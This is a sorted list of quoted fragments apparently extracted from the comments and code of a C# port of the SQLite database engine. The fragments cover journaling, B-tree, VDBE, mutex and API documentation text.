" SQLITE_DONE. If an IO error occurs, return an error code. Otherwise,"
" SQLITE_ENABLE_IOTRACE is enabled, then messages describing"
" SQLITE_ERROR and leave an error in pParse. Otherwise, populate"
" SQLITE_FUNC_NEEDCOLL ), xFunc )"
" SQLITE_FUNC_NEEDCOLL ), xStep, xFinal )"
" SQLITE_IOERR_XXX], [SQLITE_NOMEM], or"
" SQLITE_MUTEX_PTHREAD, and SQLITE_MUTEX_W32 implementations"
" SQLITE_NOMEM if the attempt to allocate Pager.pInJournal fails, or"
" SQLITE_NOMEM) to the user. However, sometimes a fault is not necessarily"
" SQLITE_OK != ( rc = read32bits( pJrnl, szJ - 12, ref cksum ) )"
" SQLITE_OK != ( rc = read32bits( pJrnl, szJ - 16, ref len ) )"
" SQLITE_OK != ( rc = read32bits( pPager.jfd, iHdrOff "
" SQLITE_OK != ( rc = sqlite3OsRead( pJrnl, aMagic, 8, szJ - 8 ) )"
" SQLITE_OK != ( rc = sqlite3OsRead( pJrnl, zMaster, len, szJ - 16 - len ) )"
" SQLITE_OK != ( rc = sqlite3OsSync( pMaster, SQLITE_SYNC_NORMAL ) )"
" SQLITE_OK != (rc = btreeGetPage(pBt, iPage, ref pPage, 0)))"
" SQLITE_OK != sqlite3CheckObjectName( pParse, zName ) )"
" SQLITE_OK == ( rc = backupTruncateFile( pFile, (int)iSize ) )"
" SQLITE_OK == ( rc = sqlite3BtreeBeginTrans( p.pDest, 2 ) )"
" SQLITE_OK is returned on success, otherwise an error code."
" SQLITE_OK is returned, it means that access is allowed.  SQLITE_DENY"
" SQLITE_OK returned. If no hot-journal file is present, "
" SQLITE_OMIT_MEMORYDB has been defined, then "":memory:"" is just a"
" SQLITE_OPEN_CREATE, 0)"
" SQLITE_OPEN_CREATE, is used to indicate that file should always"
" SQLITE_OPEN_CREATE, null )"
" SQLITE_OPEN_MAIN_DB,"
" SQLITE_OPEN_MASTER_JOURNAL, ref rc"
" SQLITE_OPEN_READWRITE, and SQLITE_OPEN_CREATE.  Silently mask"
" SQLITE_TEST or SQLITE_DEBUG are defined, then these routines"
" SQLITE_UTF8, SQLITE_UTF16BE, SQLITE_UTF16LE "
" SQLite interfaces.  However, such calls must not"
" SQLite makes its own private copy of the data immediately, before"
" SQLite returns [SQLITE_BUSY] for the first process, hoping that this"
" SQLite version 2 and SQLite version 3 should use SQLITE3_TEXT, not"
" SQLite will use no more than one scratch buffer at once per thread, so"
" Search for a cursor held open by this b-tree connection. If one exists,"
" Search for a term in the WHERE clause that is of the form ""X <op> <expr>"""
" Search for the required lock. Either a write-lock on root-page iTab, a"
" Search the B-Tree index. If no conflicting record is found, jump"
" Second part of [database.]id field, or NULL "
" Sector size doesn't matter for temporary files. Also, the file"
" See also the ""PRAGMA temp_store_directory"" SQL command."
" See also: Found, NotExists, IsUnique"
" See also: Found, NotFound, Distinct, SeekGt, SeekGe, SeekLe"
" See also: Found, NotFound, Distinct, SeekGt, SeekGe, SeekLt"
" See also: Found, NotFound, Distinct, SeekLt, SeekGe, SeekLe"
" See also: Found, NotFound, Distinct, SeekLt, SeekGt, SeekLe"
" See also: Found, NotFound, IsUnique"
" See also: NotFound, IsUnique, NotExists"
" See also: NotFound, NotExists, Found"
" See also: Rowid, MakeRecord."
" See also: [sqlite3_bind_parameter_count()],"
" See also: sqlite3FindCollSeq(), sqlite3GetCollSeq()"
" See also: sqlite3LocateCollSeq(), sqlite3FindCollSeq()"
" See also: sqlite3LocateCollSeq(), sqlite3GetCollSeq()"
" See the header comment on ""btreeInt.h"" for additional information."
" Seek the table cursor, if required "
" Select from a ""CREATE ... AS SELECT"" "
" Set the EP_Reduced, EP_TokenOnly, and EP_Static flags appropriately. "
" Set the PENDING byte to the value in the argument, if X>0."
" Set the auxillary data pointer and delete function, for the iArg'th"
" Set the database auto-commit flag to P1 (1 or 0). If P2 is true, roll"
" Set the pointer-map entries for all children of page pPage. Also, if"
" Set the variable isMemdb to true for an in-memory database, or"
" Setting this to the ""natural word"" size of your CPU may improve"
" Should be a power of 2, and ideally, evenly divide into BITVEC_USIZE."
" Similarly, if the pager has already entered the error state, do not"
" Simple ""PRAGMA journal_mode"
" Simple ""PRAGMA locking_mode"
" Since Lookup() never goes to disk, it never has to deal with locks"
" Since it is a virtual-table, the Table structure contains a pointer"
" Since it performs no memory allocation or IO, the only values that"
" Since the ASCII version of these Windows API do not exist for WINCE,"
" Since the names of named mutexes, semaphores, file mappings etc are"
" Since version 2.8.0, the journal format contains additional sanity"
" Since we do not know, guess 1 million.  aiRowEst[1] is an estimate of the"
" Size of open blob, in bytes "
" Size of pKey, or last integer key "
" Size, in bits, of the bitmap element. "
" Skip the ""sqlite_altertab_"" prefix on the name "
" So a cell consists of a 2-byte poiner, a header which is as much as"
" So if speed is of utmost importance, it makes sense to disable"
" So if this routine is called with p equal to the t3 query, then"
" So, this macro is defined instead."
" Some combination of MEM_Null, MEM_Str, MEM_Dyn, etc. "
" Some systems (for example, Windows 95) do not support the operation"
" Sometimes when requesting one lock state, additional lock states"
" Sorting is accomplished by writing records into a sorting index,"
" Specifically, this is called from within:"
" SrcList.a[].zDatabase is filled with the database name from pTable,"
" Step 5. If a usable page buffer has still not been found,"
" Store this number in ""k"".  Also compute szNew[] which is the total"
" String, possibly obtained from sqlite3Malloc "
" String, possibly obtained from sqlite3_malloc "
" String.Compare( zRight, azModeName[eMode], true ) != 0 )"
" Strings returned by sqlite3_column_text() and sqlite3_column_text16(),"
" Subverting this mechanism by using ""PRAGMA schema_version"" to modify"
" Suggested initial allocation, in elements "
" Suppose the WHERE clause is this:  a==5 AND b IN (1,2,3) AND c>5 AND c<10"
" Suppress duplicates for UNION, EXCEPT, and INTERSECT"
" Sync the journal. In other words, make sure all the pages that have"
" Syncing an in-memory journal is a no-op.  And, in fact, this routine"
" TEMP first, then MAIN, then any auxiliary databases added"
" TK_DELETE, or TK_INSTEAD.  If the event is of the form"
" TOKEN_ADJUST_PRIVILEGES, out hToken)) return false"
" TOKEN_DUPLICATE, out hToken)) return false"
" TRANS_NONE, TRANS_READ or TRANS_WRITE "
" TRIGGER, not CREATE INDEX and CREATE TABLE."
" TRIGGER.  ""a"" is the event type, one of TK_UPDATE, TK_INSERT,"
" Tables that are indexable, satisfying case 2 "
" Target table for DELETE, UPDATE, INSERT "
" Temp storage space for pCell, if needed "
" That is Ok, at this point the parent page is guaranteed to"
" The """
" The ""%z"" formatting option works exactly like ""%s"" with the"
" The "")"" that closes the CREATE INDEX statement "
" The ""B"" part of a ""A AS B"" phrase.  zName is the ""A"" "
" The ""OUTER"" keyword is present "
" The ""break"" point is here, just past the end of the outer loop."
" The ""context"" argument for a installable function.  A pointer to an"
" The ""file format"" number is an integer that is incremented whenever"
" The ""op"" member indicates whether this is a ""DELETE"", ""INSERT"", ""UPDATE"" or"
" The ""pPager.journalHdr"
" The ""printf"" code that follows dates from the 1980's.  It is in"
" The ""real"" underlying VFS "
" The ""real"" underlying file descriptor "
" The ""sqlite3_stmt"" structure pointer that is returned by sqlite3_compile()"
" The ""step_list"" member points to the first element of a linked list"
" The ""table"" is actually a sub-select or a view in the FROM clause"
" The ""version"" of SQLite is a string of the form ""X.Y.Z""."
" The ""wsdAutoext"" macro will resolve to the autoextension"
" The ""wsdHooks"" macro will resolve to the appropriate BenignMallocHooks"
" The ""wsdPrng"" macro will resolve to the pseudo-random number generator"
" The ""wsdStat"" macro will resolve to the status information"
" The ""x"" term of the order by is replaced by ""a"
" The ""xxx"" in the name ""xxx.yyy"" or ""xxx"" "
" The ""yyy"" in the name ""xxx.yyy"" "
" The ',' token after the last column defn. "
" The 8 and 9 types were added in 3.3.0, file format 4.  Prior versions"
" The CREATE and DESTROY primitives are the constructor and destructor,"
" The CURRENT_TIME, CURRENT_DATE, and CURRENT_TIMESTAMP values are"
" The Gregorian calendar system is used for all dates and times,"
" The HH, MM, and SS must each be exactly 2 digits.  The"
" The IDLIST following the table name is always optional.  If omitted,"
" The IN, SELECT, or EXISTS operator "
" The ORDER BY term is an integer constant.  Again, set the column"
" The P1 cursor must be for a real table, not a pseudo-table."
" The Pager.needSync flag is never be set for temporary files, or any"
" The TEST primitive includes a ""batch"" number.  The TEST primitive"
" The Vdbe.aColName array contains 5n Mem structures, where n is the"
" The [sqlite3_config]([SQLITE_CONFIG_PCACHE], ...) interface can"
" The _XOPEN_SOURCE define causes problems for Mac OS X we are told,"
" The acquisition might fail for several reasons.  In all cases,"
" The allocation (static, dynamic etc.) and encoding of the Mem may be"
" The auto-commit flag is true, and the vdbe program was"
" The basic idea is to do a nested loop, one loop for each table in"
" The bottom of the main insertion loop, if the data source"
" The cache is initialized to zero, indicating an invalid cache."
" The cell may contain a pointer to an overflow page. If so, write"
" The collating sequence is marked as ""explicit"" using the EP_ExpCollate"
" The collation sequence must be defined at this point, even if"
" The column is identified by the second, third and fourth parameters to"
" The column list has only names, not types or collations.  This"
" The comparison is a sort comparison, so NULLs compare equal,"
" The conflict algorithm (OE_Abort, OE_Replace, etc.) "
" The conflict algorithm. (OE_Abort, OE_Ignore, etc) "
" The current implementation interprets ""LIMIT 0"" to mean"
" The cursor can seek to a BTree entry with a particular key, or"
" The database file change-counter is updated,"
" The database file itself is greater than 0 bytes in size, and"
" The database size has already been measured and cached, so failure"
" The destination may need to be truncated, and"
" The details of the operation codes, their meanings, the parameters"
" The expression list, ID, and source lists return by sqlite3ExprListDup(),"
" The fifth argument to sqlite3_bind_blob(), sqlite3_bind_text(), and"
" The file is divided into pages.  The first page is called page 1,"
" The final parameter, xDel, must be one of SQLITE_DYNAMIC, SQLITE_STATIC"
" The first argument, ""db"", is a [database connection] obtained from a"
" The first argument, pCur, is a cursor opened on some b-tree. Count the"
" The first host parameter has an index of 1, not 0."
" The first invocation, to obtain permission to INSERT a row into the"
" The first loop just checks to see if there are any """
" The first time this is called on a shared-btree, nBytes bytes of memory"
" The first time this routine is called, we code an OP_Goto that"
" The following are used as the second parameter to sqlite3Savepoint(),"
" The following blocks should probably Debug.Assert in debug mode, but they"
" The following group of routines make deep copies of expressions,"
" The following macros mimic the standard library functions toupper(),"
" The following modules is an enhanced replacement for the ""printf"" subroutines"
" The following strings, ""none"", ""full"" and ""incremental"" are"
" The following table is searched linearly, so it is good to put the"
" The following three functions, heightOfExpr(), heightOfExprList()"
" The following three macros, FUNCTION(), LIKEFUNC() and AGGREGATE() are"
" The following variable, if set to a non-zero value, becomes the result"
" The fourth parameter, eTextRep, specifies what"
" The functions querySharedCacheTableLock(), setSharedCacheTableLock(),"
" The heap pointer is not NULL, then install one of the"
" The identifier might also be a string.  The value is a string, and"
" The implementation of this routine was generated by a program,"
" The index cursors might not be used, but if they are used they"
" The index has as many as three equality constraints, but in this"
" The index of the cursor opened on the b-tree (database table, database index"
" The indice of the ""new"" row to access "
" The indice of the ""old"" row to access "
" The initial batch number is zero, so if the very first TEST contains"
" The inner query or ""subquery"" "
" The input value in P3 might be of any type: integer, real, string,"
" The input, pIn, is a binary tree (or subtree) of RowSetEntry objects."
" The interface to the code in fault.c used for identifying ""benign"""
" The journal file exists in the file system, and"
" The key for INTKEY tables, or number of bytes in key "
" The key is not copied in this instance.  If a malloc fails, then"
" The last character of the prefix ""abc"" is incremented to form the"
" The left-most column is 1.  In other words, the value returned is the"
" The limit is called ""soft"", because if [sqlite3_release_memory()]"
" The makefile scans the vdbe.c source file and creates the ""opcodes.h"""
" The member variables sqlite.errCode, sqlite.zErrMsg and sqlite.zErrMsg16"
" The module name must be defined. Also, by this point there must"
" The name of a result column is the value of the ""AS"" clause for"
" The name of this file under configuration management is ""sqlite.h.in""."
" The new page is marked as dirty.  (In other words, sqlite3PagerWrite()"
" The new root-page may not be allocated on a pointer-map page, or the"
" The new terms are ""dynamic"" and are children of the original BETWEEN"
" The non-standard VACUUM command is used to clean up the database,"
" The number of bits in a Bitmask.  ""BMS"" means ""BitMask Size""."
" The numbers are obtained at random and have no special meaning, other"
" The operator is ""natural cross join"".  The A and B operands are stored"
" The optimizer automatically inverts terms of the form ""expr OP column"""
" The original design allowed these amounts to vary, but as of"
" The pBt is no longer on the sharing list, so we can access"
" The pCx.pCursor will be close automatically, if it exists, by"
" The pH containing ""elem"" "
" The page number is greater than Pager.dbSize, or"
" The page-number is less than or equal to PagerSavepoint.nOrig, and"
" The permutation is only valid until the next OP_Permutation, OP_Compare,"
" The phrase ""alpha"" or ""beta"" might be appended after the Z."
" The pointer is allowed to be NULL, which is prudent.  But it turns out"
" The recommended test is X==2.  If the return value is 2, that means"
" The remaining arguments to the application-supplied routine are two strings,"
" The remaining seven methods defined by this structure (xMutexAlloc,"
" The rest are extensions, not normally found in printf() "
" The result of the expression is the Ri for the first matching Ei,"
" The result set must be the special operator """
" The returned value is always between 0 and 6, as follows:"
" The returned value of this function indicates the b-tree type, as follows:"
" The second argument to sqlite3_db_config(D,V,...)  is the"
" The second argument to this function, op, is always SAVEPOINT_ROLLBACK"
" The second argument, ""zSql"", is the statement to be compiled, encoded"
" The second argument, 'db_enc' is the text encoding used by the vdbe for"
" The second call, to obtain permission to create the table, is made now."
" The second callback argument is one of [SQLITE_INSERT], [SQLITE_DELETE],"
" The seventh, eighth and ninth parameters, xFunc, xStep and xFinal, are"
" The size chosen is a little less than a power of two.  That way,"
" The size of the ""context"" stack "
" The sqlite3_blob_close() function finalizes the vdbe program,"
" The sqlite3_mutex_try() routine is very rarely used, and when it"
" The sqlite3_result_text(), sqlite3_result_text16(),"
" The sqlite3_soft_heap_limit() interface places a ""soft"" limit"
" The terms ""protected"" and ""unprotected"" refer to whether or not"
" The text of the conversion is pointed to by ""bufpt"" and is"
" The third argument may be one of the constants [SQLITE_UTF8],"
" The third argument to this function, aOvflSpace, is a pointer to a"
" The user of """
" The userdata is 0x1 for left trim, 0x2 for right trim, 0x3 for both."
" The value is currently a real number, drop its fractional part."
" The value of aiColumn is {2, 0}.  aiColumn[0]==2 because the"
" The value of the ""pending"" byte must be 0x40000000 (1 byte past the"
" The xCheckReservedLock() method checks whether any database connection,"
" The xInit method initializes the memory allocator.  (For example,"
" The xMalloc, xFree, and xRealloc methods must work like the"
" The xRandomness(), xSleep(), and xCurrentTime() interfaces"
" The zDb variable is the name of the database (the ""X"").  This value may be"
" Then pName1 is set to ""xxx"" and pName2 ""yyy"". On the other hand if"
" Then pName1 is set to ""yyy"" and pName2 is """"."
" Then the ""b"" IdList records the list ""a,b,c""."
" Then the following macros can be used to set, clear, or test"
" Then, for each indexed term, the following. The arguments to"
" There are no pages on the freelist, so create a new page at the"
" There are three arguments: An 8-byte aligned pointer to the memory,"
" There are three different approaches to obtaining space for a page,"
" There is a typedef for this structure in sqlite.h.  So all routines,"
" There is an implied ""Halt 0 0 0"" instruction inserted at the very end of"
" There may two separate implementations of the collation function, one"
" Therefore, the P4 parameter is only required if the default value for"
" These macros can be used to test, set, or clear bits in the"
" These routines are used to make sure that an index, trigger, or"
" These routines are workalikes of the ""printf()"" family of functions"
" These routines form the ""result set query"" interface."
" These two functions (collectively known as ""function creation routines"")"
" This can occurs if you have something like ""SELECT new.x"
" This code copies current group by terms in b0,b1,b2,..."
" This collating sequence is intended to be used for ""case independant"
" This commit is not part of a multi-file transaction, and"
" This expression is a """
" This feature is used to implement ""EXPLAIN""."
" This file contains code to support the concept of ""benign"""
" This file contains code use to manipulate ""Mem"" structure.  A ""Mem"""
" This file contains code used for creating, destroying, and populating"
" This file contains functions for allocating memory, comparing"
" This file contains inline asm code for retrieving ""high-performance"""
" This file contains routines used to translate between UTF-8,"
" This function finalizes the journal file, either by deleting,"
" This function is called after an ""ALTER TABLE ... ADD"" statement"
" This function is called by the parser when it parses a command to create,"
" This function is exactly the same as sqlite3_create_function(), except"
" This function is only available internally, it is not part of the"
" This function is similar to sqlite3ExprDup(), except that if pzBuffer"
" This function may return SQLITE_NOMEM if a memory allocation fails,"
" This function returns SQLITE_OK if everything is successful, an IO"
" This function returns the number of row changes caused by [INSERT],"
" This function should be called when an IOERR, CORRUPT or FULL error"
" This function uses the C-library functions time(), gmtime()"
" This function works in milliseconds, but the underlying OsSleep()"
" This is GLOB, not LIKE "
" This is a change as of SQLite version 3.5.0. In prior versions of SQLite,"
" This is called after connection ""db"" has attempted some operation"
" This is correct.  Had we used %s instead of %q, the generated SQL"
" This is the default collating function named ""BINARY"" which is always"
" This is the implementation of the page cache subsystem or ""pager""."
" This is true if any column of the row is changed, even a column"
" This macro is used to ""hide"" some ugliness in casting an int"
" This might be a false positive.  But if it is, then the"
" This might involve two separate loops with an OP_Sort in between, or"
" This module implements an object we call a ""RowSet""."
" This object is variously known as a ""prepared statement"" or a"
" This only applies to the root node of pExpr, so the statement:"
" This only occurs for GLOB, not LIKE "
" This opcode invokes the parser to create a new virtual machine,"
" This opcode resets the VMs internal change counter to 0. If P1 is true,"
" This routine ""expands"" a SELECT statement and all of its subqueries."
" This routine adds a specific database name, if needed, to the target when"
" This routine also generates code to check constraints.  NOT NULL,"
" This routine checks if it is possible to delete the master journal file,"
" This routine is a Walker callback for ""expanding"" a SELECT statement."
" This routine is a no-op except on its very first call for the process,"
" This routine is called from the TCL test function ""translate_selftest""."
" This routine is called to report the final "")"" that terminates"
" This routine is called, for example, just before deleting the Table"
" This routine is identical to the [sqlite3_create_module()] method,"
" This routine is usually quick, but can be N"
" This routine must be called to initialize the memory allocation,"
" This routine retrieves the pointer map entry for page 'key', writing"
" This routine returns the number of errors.  If errors occur, then"
" This routine will automatically close any cursors, lists, and/or"
" This section of code's only ""output"" is via Debug.Assert() statements. "
" This step function is used for both the min() and max() aggregates,"
" This structure, sometimes called a a ""virtual table module"", "
" This version of ""lempar.c"" is modified, slightly, for use by SQLite."
" This will never be called, but defined to make the code compile "
" Throughout the rollback process, each time a page is rolled back, the"
" Thus, we need to calculate a value, nOff, between 0 and 7, to shift"
" Thus, when called from the top level, this function returns the"
" To append 3 new entries onto the end, do this:"
" To avoid a resource leak, every open [BLOB handle] should eventually"
" To avoid deadlock, first release all locks with a larger"
" To avoid deadlocks, multiple Btrees are locked in the same order"
" To avoid this scenario, the sqlite3_unlock_notify() performs deadlock"
" To clear the most recent error for sqlite handle ""db"", sqlite3Error"
" To compile without implementing sqlite3Hwtime() for your platform,"
" To execute an SQL query, it must first be compiled into a byte-code"
" To find the largest key value on pPage, first find the right-most"
" To force any register to be an integer, just add 0."
" To get here, there need to be 2"
" To look at it another way, this routine resets the state of the"
" To make an existing VFS into the default VFS, register it again"
" To resolve result-set references, look for expression nodes of the"
" To understand the concept of flattening, consider the following"
" To work around this, if the journal file does appear to contain"
" Token for <value>, or NULL "
" Too many attached databases,"
" Top of insert loop. Label ""C"" in templates 3 and 4 "
" True (1) if Y,M,D are valid "
" True (1) if h,m,s are valid "
" True . read/write access, false . read-only "
" True for UPDATE, False for INSERT "
" True for a ""natural"" join "
" True for an infix function: LIKE, GLOB, etc "
" True for malloced memory, false for static "
" True for select lists like ""count("
" True if "" "" flag is present "
" True if ""!"" flag is present "
" True if """
" True if ""-"" flag is present "
" True if ""l"" flag is present "
" True if range end uses ==, >= or <= "
" True if range start uses ==, >= or <= "
" True if the ""ll"" flag is present "
" True, if allocated from cache "
" Type of the array ""element"" for the bitmap representation."
" UNIQUE constraint.  If pTable and pIndex are NULL, use pParse.pNewTable"
" UTF-16 encoded strings, the other functions return UTF-8. {END}"
" UTF-16 little endian, or UTF-16 big endian, respectively."
" UTF-16 little-endian, or UTF-16 big-endian, respectively. The"
" UTF-16 string stored in pMem. If one is present, it is removed and"
" UTF-16, UTF-16BE, and UTF-16LE."
" Under MSVC, this NaN test may fail if compiled with a floating-"
" Under memory stress, invoke xStress to try to make pages clean."
" Unless -DSQLITE_TEST=1 is used, these routines are all no-ops"
" Unless SQLite is compiled in secure-delete mode. In this case,"
" Unless an error occurs, the following loop runs one iteration for each"
" Unless deadlock is detected (see below), sqlite3_unlock_notify() always"
" Unless the database is sharable and unlocked, then BtShared.db"
" Unless the pager is in error-state, discard all in-memory pages. If"
" Unlike most of the SQLite API, this function is not guaranteed to"
" Use ""(double)2"" instead of ""2.0"" in case OMIT_FLOATING_POINT"
" Used for sub-selects and ""<expr> IN (<select>)"" "
" Using an ""if (SQLITE_UTF16NATIVE==SQLITE_UTF16BE)"" construct here"
" Usually, the default mutex implementations provided by SQLite are"
" VDBE, but do not rollback the transaction."
" VFS is registered with a name that is NULL or an empty string,"
" VFS, and mutex subsystems prior to doing any serious work with"
" VM, then we do either a commit or rollback of the current transaction."
" VMs (apart from this one), then the COMMIT or ROLLBACK statement fails."
" VTable pVTab = sqlite3GetVTable(db, pTab)"
" Variable zOut is set to point at the output buffer, space obtained"
" Variables pIn1, pIn2, and pIn3 are made to point to appropriate"
" Via the BackupUpdate() and BackupRestart() functions, which are"
" Virtual Database Engine (VDBE).  A separate file (""vdbeaux.c"")"
" WARNING:  In order to maintain backwards compatibility, add new"
" WO_GE ), pIdx )"
" WO_GE, null ) != null )"
" WO_GE, null ) == null "
" WO_GE, null )"
" WO_GE, pProbe ) != null )"
" WO_GE, pProbe )"
" WO_IN, null )"
" WO_LE ), pIdx )"
" WO_LE, null ) != null )"
" WO_LE, null )"
" WO_LE, pProbe ) != null )"
" Was sqlite3_global_recover(), but that function is deprecated "
" We also compute the number of columns in the record.  For cursors,"
" We call AltB, AeqB, AgtB, EofA, and EofB ""subroutines"" but they are not"
" We call this the ""compound-subquery flattening""."
" We could factor them out, but then we would end up adding an"
" We do this as a macro so that if the SQLITE_OMIT_MEMORYDB macro is set,"
" We only unroll the first 1-, 2-, and 3- byte cases.  The very"
" When NB==3, this one optimization makes the database"
" When OP_Insert is executed to insert a row in to the pseudo table,"
" When SQLITE_OMIT_WSD is defined, it means that the target platform does"
" When SQLite calls the xTruncate() method, the cache must discard all"
" When X.pBlockingConnection==Y, that means that something that X tried"
" When X.pUnlockConnection==Y, that means that X is waiting for Y to"
" When [sqlite3_prepare_v2()] is used to prepare a statement, the"
" When a PgHdr1 structure is allocated, the associated PCache1.szPage"
" When a blocking connections transaction is concluded, there may be"
" When a cached column is reused, make sure that its register is"
" When a call to [sqlite3_step()] returns SQLITE_LOCKED, it is almost "
" When a configuration option is set, sqlite3_config() returns [SQLITE_OK]."
" When a function parameter is not used at all within the body of a function,"
" When a master journal file is created, it is populated with the names"
" When a savepoint is created, the PagerSavepoint.iHdrOffset field is"
" When a single database file can shared by two more database connections,"
" When adding a P4 argument using P4_KEYINFO, a copy of the KeyInfo structure"
" When adding an index to the list of indices for a table, make"
" When adding new APIs, add them to the bottom of this structure"
" When an error occurs, [sqlite3_step()] will return one of the detailed"
" When an unlock-notify callback is registered, the application provides a "
" When assigning bitmask values to FROM clause cursors, it must be"
" When building up a FROM clause in the parser, the join operator"
" When converting from UTF-16, the maximum growth results from"
" When database the cursor belongs to, or -1 "
" When debugging the code generator in a symbolic debugger, one can"
" When doing a nested parse, one can include terms in an expression"
" When doing a nested parse, you can include terms in an expression"
" When eOperator!=0, prereqRight and prereqAll record sets of cursor numbers,"
" When finished, drop the ephemeral table."
" When journal_mode==OFF the dbOrigSize is always zero, so this"
" When multiple implementations of the same function are available, SQLite"
" When p.explain==1, each instruction is listed.  When"
" When rolling back a hot journal, nRec==0 always means that the next"
" When running in shared-cache mode, a database operation may fail with"
" When setting the auto_vacuum mode to either ""full"" or"
" When testing, keep a count of the number of open files."
" When that happens, the second error will be reported since these"
" When the NATURAL keyword is present, add WHERE clause terms for"
" When the SQLITE_SYNC_DATAONLY flag is used, it means that the"
" When the b-tree is being used for membership tests, the calling function"
" When the callback is invoked, the first argument passed is a copy"
" When the callback returns [SQLITE_OK], that means the operation"
" When the code that this function generates is executed, the following"
" When the commit hook callback routine returns zero, the [COMMIT]"
" When the schema cookie changes, record the new cookie internally "
" When the serialized [threading mode] is in use, it might be the"
" When the virtual-table mechanism stabilizes, we will declare the"
" When there is an IN operator, we also have a ""addrNxt"" label that"
" When this function is called, the database file has been completely"
" When this global variable is positive, it gets decremented once before"
" When this is called, the master journal should already have been"
" When using ENABLE_MEMORY_MANAGEMENT, memory cell buffers can"
" When virtual tables intend to provide an overloaded function, they"
" When we speak of the journal header, we mean the first 8 items above."
" When writing to an index b-tree that resides in a sharable database, the"
" Whenever Mem contains a valid string or blob representation, one of"
" Whenever a row or result data is available, this routine will either"
" Whenever the CREATE TRIGGER keywords are seen, the statement"
" Whenever this column is read, the record number will be substituted"
" Whether or not an error is returned, it is the responsibility of the"
" Whether or not an error occurs when it is opened, resources"
" Whether or not the journal file is opened by this function, the"
" Whether the function call succeeded or failed, set the output parameters"
" While the pager is in the RESERVED state, the original database file"
" Wildcard of the form """
" Wildcards consisting of a single """
" Wildcards like "":aaa"", ""$aaa"" or ""@aaa"".  Reuse the same variable"
" Wildcards of the form """
" Wildcards of the form "":aaa"", ""@aaa"" or ""$aaa"" are assigned the same number"
" WinCE has no concept of a relative pathname, or so I am told. "
" With SQLITE_ACCESS_EXISTS, the xAccess method"
" With SQLITE_ACCESS_READ, the xAccess method"
" With SQLITE_ACCESS_READWRITE, the xAccess method"
" With the ""v2"" interface, any of the other [result codes] or"
" With the addition of multiple database support, the following structure"
" With the legacy interface, a more specific error code (for example,"
" With this option, sqlite3VtabSync() is defined to be simply"
" With this routine, there is no guarantee  that results will"
" Within the union, pIdx is only used when wsFlags"
" Within this file, the parseCell() macro can be called instead of"
" Worse, if the original is deallocated, the copy becomes invalid."
" Write an execution trace here, if not NULL "
" Y is waiting on connection X's transaction, then neither connection"
" Year, month, and day "
" [INTEGER PRIMARY KEY] column has been explicitly declared, then the output"
" [SQLITE_CONFIG_SCRATCH].  The value returned is in allocations, not"
" [SQLITE_DONE], [SQLITE_ROW], [SQLITE_ERROR], or [SQLITE_MISUSE]."
" [SQLITE_DONE], a call to sqlite3_backup_step() may return [SQLITE_READONLY],"
" [SQLITE_ENABLE_MEMSYS5] are defined, then the alternative memory"
" [SQLITE_FLOAT], [SQLITE_TEXT], [SQLITE_BLOB], or [SQLITE_NULL].  The value"
" [SQLITE_INTERRUPT], [SQLITE_SCHEMA], [SQLITE_CORRUPT], and so forth)"
" [SQLITE_LOCK_RESERVED], [SQLITE_LOCK_PENDING], or [SQLITE_LOCK_EXCLUSIVE])"
" [SQLITE_NOMEM], [SQLITE_BUSY], [SQLITE_LOCKED], or an"
" [SQLITE_NOMEM], [SQLITE_BUSY], and [SQLITE_INTERRUPT]) then the"
" [SQLITE_READONLY] is returned, then "
" [SQLITE_THREADSAFE] macro is 0, "
" [SQLITE_UTF16LE], or [SQLITE_UTF16BE], indicating that the user-supplied"
" [UPDATE], [DELETE], or by [ON CONFLICT] side-effects"
" [database connection], supplied in the first argument."
" [prepared statement].  In the ""v2"" interface,"
" [sqlite3_aggregate_context()], [sqlite3_user_data()],"
" [sqlite3_bind_parameter_count()], and"
" [sqlite3_bind_parameter_name()], and [sqlite3_bind_parameter_index()]."
" [sqlite3_bind_parameter_name()], and"
" [sqlite3_column_blob()], [sqlite3_column_text()], etc. into"
" [sqlite3_column_value()] is used in any other way, including calls"
" [sqlite3_context_db_handle()], [sqlite3_get_auxdata()],"
" [sqlite3_create_collation()], [sqlite3_create_collation16()], or"
" [sqlite3_errcode()], [sqlite3_errmsg()], and [sqlite3_errmsg16()] functions."
" [sqlite3_file] object (or, more commonly, a subclass of the"
" [sqlite3_file_control()] interface.  The second ""op"" argument is an"
" [sqlite3_malloc()] happens within sqlite3_get_table(), the calling"
" [sqlite3_next_stmt(D,S)] must refer to an open database"
" [sqlite3_open16()], or [sqlite3_open_v2()].  "
" [sqlite3_open_v2()] interfaces are its constructors, and [sqlite3_close()]"
" [sqlite3_open_v2()], and not previously closed."
" [sqlite3_prepare_v2()], [sqlite3_create_function()], and"
" [sqlite3_prepare_v2()], [sqlite3_step()], and [sqlite3_finalize()]."
" [sqlite3_shutdown()], if the application invokes this API. It can be used"
" [sqlite3_value_bytes()], [sqlite3_value_bytes16()], [sqlite3_value_text()],"
" [unprotected sqlite3_value] object is required, so either"
" _WIN32_WINNT defined to a value >= 0x0400.  Currently, the only"
" a "":"" character you should prefix the filename with a pathname such as"
" a CASE expression or an IN expression of the form ""<lhs> IN (<y>, <z>...)""."
" a SHARED lock.  If we are acquiring a SHARED lock, the acquisition of"
" a UNIQUE index.  In this mode, you can only have a single NULL entry"
" a VDBE (or an ""sqlite3_stmt"" as it is known to the outside world.)  Prior"
" a blob with a zero-filled tail, then buf[] might be just the right"
" a column, use numeric affinity."
" a forward order scan on a descending index, interchange the"
" a hot-journal during hot-journal rollback, 0 changes will be made"
" a join type, but put an error in the pParse structure."
" a join, then transfer the appropriate markings over to derived."
" a legal notice, here is a blessing:"
" a maximum of four divider cells into the parent page, and the maximum"
" a negative nCol, it means two or more views form a loop, like this:"
" a negative number.  (The leading ""-"" is omitted from zNum.)  This"
" a new one.  If an OOM error does occurs, then the prior value of pList"
" a no-op.  If an error occurs, the appropriate error code is written"
" a non-zero batch number, it will see all prior INSERTs."
" a pointer to the matching FuncDef if found, or 0 if there is no match."
" a read-lock on the same table, then SQLite arbitrarily selects one of "
" a result-set expression, then the term resolves to a copy of the"
" a schema-lock excludes all other database users, the write-lock would"
" a similar or greater lock is already held, this function is a no-op"
" a single flat select, like this:"
" a single row is generated, output is always in sorted order "
" a single-threaded application.  The SQLITE_MUTEX_OS2,"
" a statement of the form  ""INSERT INTO <iDb, pTab> SELECT ..."" can"
" a sufficient number of times to complete the backup operation. Or, if"
" a temporary, then set pReg to zero."
" a text string which is represented as UTF-8, UTF-16 native byte order,"
" a transaction.  If we are already within a transaction, then a checkpoint"
" a trigger.  In other words, if you reference the special ""new"""
" a valid header following Pager.journalOff, then write a 0x00"
" a way that makes the statement no longer valid, [sqlite3_step()] will still"
